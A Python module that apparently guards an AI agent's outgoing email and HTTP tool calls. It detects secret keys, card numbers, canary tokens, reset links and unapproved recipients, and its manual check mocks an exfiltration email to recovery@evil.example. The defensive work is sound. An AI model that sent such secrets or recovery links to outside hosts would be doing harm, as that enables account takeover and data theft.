"""Layer 3: action guard.

Checks an outgoing tool call before it runs. Pure Python, no network, fully tested.
Precedence: BLOCK beats CONFIRM beats ALLOW. All matched values are masked in evidence.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parent.parent
DEFAULT_POLICY = ROOT / "shield" / "policy.json"
DEFAULT_CANARIES = ROOT / "sandbox" / "fakefs" / "canaries.json"

VERDICT_BY_ACTION = {"BLOCK": "BLOCKED", "CONFIRM": "NEEDS_CONFIRM"}
_RANK = {"ALLOWED": 0, "NEEDS_CONFIRM": 1, "BLOCKED": 2}

# 13-19 digits, optionally separated by single spaces or dashes.
_CARD_RE = re.compile(r"(?<!\d)(?:\d[ -]?){12,18}\d(?!\d)")
_SECRET_RES: dict[str, re.Pattern[str]] = {
    "aws_access_key_id": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "github_token": re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{22,}\b"),
    "sk_api_key": re.compile(r"\bsk-[A-Za-z0-9_\-]{20,}\b"),
    "private_key": re.compile(r"-----BEGIN (?:[A-Z]+ )?PRIVATE KEY-----"),
    "recovery_link": re.compile(
        r"https?://\S*(?:reset|recover|magic|verify|signin|login)\S*[?&](?:token|code|key)=\S+",
        re.IGNORECASE,
    ),
}
_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@([A-Za-z0-9.\-]+\.[A-Za-z]{2,})")


@dataclass
class Decision:
    verdict: str = "ALLOWED"
    rule_triggered: str | None = None
    severity: str | None = None
    reason: str = "No rule matched"
    evidence: dict[str, Any] = field(default_factory=dict)
    layer: int = 3

    def as_event_fields(self) -> dict[str, Any]:
        return {
            "verdict": self.verdict,
            "rule_triggered": self.rule_triggered,
            "severity": self.severity,
            "reason": self.reason,
            "evidence": self.evidence,
            "layer": self.layer if self.rule_triggered else None,
        }


# ---------- helpers ----------

def luhn_valid(digits: str) -> bool:
    """Return True if the digit string passes the Luhn checksum."""
    if not digits.isdigit() or not 13 <= len(digits) <= 19:
        return False
    total = 0
    for i, ch in enumerate(reversed(digits)):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def mask(value: str, keep: int = 4) -> str:
    """Mask a sensitive value, keeping the last `keep` characters."""
    v = value.strip()
    if len(v) <= keep:
        return "*" * len(v)
    return "*" * (len(v) - keep) + v[-keep:]


def _flatten(obj: Any) -> str:
    """Turn nested tool args into one searchable string."""
    if isinstance(obj, str):
        return obj
    if isinstance(obj, dict):
        return "\n".join(_flatten(v) for v in obj.values())
    if isinstance(obj, (list, tuple, set)):
        return "\n".join(_flatten(v) for v in obj)
    return "" if obj is None else str(obj)


def _recipients(tool: str, args: dict[str, Any]) -> list[str]:
    """Hosts or email domains this call would contact."""
    out: list[str] = []
    if tool == "send_email":
        to = args.get("to", [])
        for addr in [to] if isinstance(to, str) else list(to):
            for part in re.split(r"[,;\s]+", str(addr)):
                if part:
                    out.append(part.lower())
    elif tool == "http_request":
        host = urlparse(str(args.get("url", ""))).hostname
        if host:
            out.append(host.lower())
    return out


# ---------- checks (names match "check" in policy.json) ----------

def check_canary_token(tool: str, args: dict[str, Any], ctx: dict[str, Any]) -> list[str]:
    text = _flatten(args)
    squashed = re.sub(r"[ \-]", "", text)
    hits = []
    for c in ctx["canaries"]:
        if c in text or re.sub(r"[ \-]", "", c) in squashed:
            hits.append(mask(c))
    return hits


def check_luhn_card_number(tool: str, args: dict[str, Any], ctx: dict[str, Any]) -> list[str]:
    hits = []
    for m in _CARD_RE.finditer(_flatten(args)):
        digits = re.sub(r"\D", "", m.group())
        if luhn_valid(digits):
            hits.append(mask(digits))
    return hits


def check_secret_pattern(tool: str, args: dict[str, Any], ctx: dict[str, Any]) -> list[str]:
    text = _flatten(args)
    hits = []
    for name, rx in _SECRET_RES.items():
        for m in rx.finditer(text):
            hits.append(f"{name}:{mask(m.group(), 6)}")
    return hits


def check_unapproved_recipient(tool: str, args: dict[str, Any], ctx: dict[str, Any]) -> list[str]:
    allow = ctx["allowlist"]
    bad = []
    for r in _recipients(tool, args):
        if "@" in r:
            m = _EMAIL_RE.fullmatch(r)
            domain = m.group(1) if m else r.split("@")[-1]
            if r not in allow.get("email_addresses", []) and domain not in allow.get("email_domains", []):
                bad.append(r)
        elif r not in allow.get("url_hosts", []):
            bad.append(r)
    return bad


def check_destructive_action(tool: str, args: dict[str, Any], ctx: dict[str, Any]) -> list[str]:
    return [tool]


CHECKS = {
    "canary_token": check_canary_token,
    "luhn_card_number": check_luhn_card_number,
    "secret_pattern": check_secret_pattern,
    "unapproved_recipient": check_unapproved_recipient,
    "destructive_action": check_destructive_action,
}


# ---------- guard ----------

class ActionGuard:
    """Evaluate tool calls against policy.json."""

    def __init__(self, policy_path: Path = DEFAULT_POLICY, canaries_path: Path = DEFAULT_CANARIES):
        policy = json.loads(Path(policy_path).read_text())
        self.rules: list[dict[str, Any]] = policy["rules"]
        canaries: Iterable[str] = []
        if Path(canaries_path).exists():
            canaries = json.loads(Path(canaries_path).read_text()).get("canaries", [])
        self.ctx = {"allowlist": policy.get("user_allowlist", {}), "canaries": list(canaries)}

    def evaluate(self, tool: str, args: dict[str, Any] | None) -> Decision:
        args = args or {}
        best = Decision()
        matched: list[dict[str, Any]] = []
        for rule in self.rules:
            if tool not in rule["tools"]:
                continue
            hits = CHECKS[rule["check"]](tool, args, self.ctx)
            if not hits:
                continue
            verdict = VERDICT_BY_ACTION[rule["action"]]
            matched.append({"rule": rule["rule"], "matches": hits})
            if _RANK[verdict] > _RANK[best.verdict]:
                best = Decision(verdict, rule["rule"], rule["severity"], rule["reason"])
        if matched:
            best.evidence = {"matched_rules": matched}
        return best


if __name__ == "__main__":  # quick manual check
    g = ActionGuard()
    print(g.evaluate("send_email", {"to": "recovery@evil.example",
                                    "body": "https://accounts.example-mail.test/reset?token=CANARY-R7Q2-XK91"}))
